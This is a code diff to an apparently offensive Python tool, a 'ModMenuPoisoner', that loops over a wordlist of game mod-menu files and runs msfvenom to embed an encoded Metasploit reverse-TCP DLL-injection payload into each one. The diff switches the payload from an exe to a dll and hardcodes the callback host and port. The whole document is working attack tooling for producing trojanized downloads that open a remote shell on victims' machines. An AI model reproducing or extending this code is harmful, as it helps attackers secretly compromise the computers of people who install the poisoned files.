@@ -11,17 +11,18 @@ import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
-payload_Generate = 'windows/meterpreter_reverse_https'
-LHOST = str(raw_input("Enter LHOST (or 8.8.8.8 if you don't care): "))
-LPORT = str(raw_input("Enter LPORT (usually 443 is good enough): "))
+payload_Generate = 'windows/patchupdllinject/reverse_tcp_uuid'
+LHOST = '8.8.8.8'
+LPORT = '443'
 # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 bad_Bytes = 'x00'
 payload_Encoder = 'x86/shikata_ga_nai'
 payload_Iterations = '1'
-output_Format = 'exe'
+output_Format = 'dll'
 output_Dir = '/root/Documents/ModMenusReencoded/'
+wordlist_file = '/root/ModMenuPoisoner/WordlistOfMods.txt'
 
-wordlist_input = str(raw_input("Enter a wordlist file of mod menu filepaths, example.exe, once per line: "))
+wordlist_input = wordlist_file
 wordlist = open(wordlist_input, 'r')
 
 # opens wordlist asnd reads each line into a variable
@@ -41,7 +42,7 @@ while True:
         basename_mod_menu = os.path.basename(input_Mod_Menu)
         reencoded_name = basename_mod_menu
         reencoded_File = output_Dir + reencoded_name
-        cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -b '\{4}' -e {5} -i {6} -f {7} -o {8}".format(
+        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} DLL="{3}" -b '\{4}' -e {5} -i {6} -f {7} -o "{8}" """.format(
             payload_Generate,
             LHOST,
             LPORT,
